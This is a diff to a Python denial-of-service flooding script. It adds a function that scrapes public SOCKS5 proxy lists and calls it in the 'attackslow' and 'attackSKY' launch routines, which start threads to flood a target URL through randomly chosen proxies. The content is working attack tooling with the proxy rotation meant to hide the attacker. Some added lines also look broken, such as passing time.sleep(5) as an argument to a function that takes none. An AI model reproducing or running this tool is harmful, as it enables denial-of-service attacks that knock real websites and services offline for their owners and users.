@@ -1,7 +1,8 @@
 # -*- coding: utf-8 -*-
+#code by hasoki 
+# this is a gift don't edit this line
 from os import system, name
 import httpx
-#import asyncio
 from httpx import AsyncClient, Headers
 import os, threading, requests, cloudscraper, datetime, time, socket, socks, ssl, random
 from urllib.parse import urlparse
@@ -157,6 +158,24 @@ method = [
     "POST",
     "HEAD",
 ]
+proxyResources = [
+    'https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all',
+    'https://www.proxy-list.download/api/v1/get?type=socks5',
+    'https://www.proxyscan.io/download?type=socks5',
+    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt',
+]
+socksFile= "socks5.txt"
+#GET SOCKS
+def socksCrawler():
+    global socksFile, socksResources
+    f = open(socksFile,'wb')
+    for url in proxyResources:
+        try:
+            f.write(requests.get(url).content)
+        except:
+            pass
+    f.close()
+    
 def get_target(url):
     url = url.rstrip()
     target = {}
@@ -638,6 +657,7 @@ def attackslow(url, timer, threads):
         threading.Thread(target=Launchslow, args=(url, timer)).start()
         
 def Launchslow(url, timer):
+    socksCrawler(time.sleep(5))  
     prox = open("./socks5.txt", 'r').read().split('\n')
     proxy = random.choice(prox).strip().split(":")
     timelol = time.time() + int(timer)
@@ -716,6 +736,7 @@ def attackSKY(url, timer, threads):
         threading.Thread(target=LaunchSKY, args=(url, timer)).start()
 
 def LaunchSKY(url, timer):
+    socksCrawler(time.sleep(5))  
     prox = open("./socks5.txt", 'r').read().split('\n')
     proxy = random.choice(prox).strip().split(":")
     timelol = time.time() + int(timer)
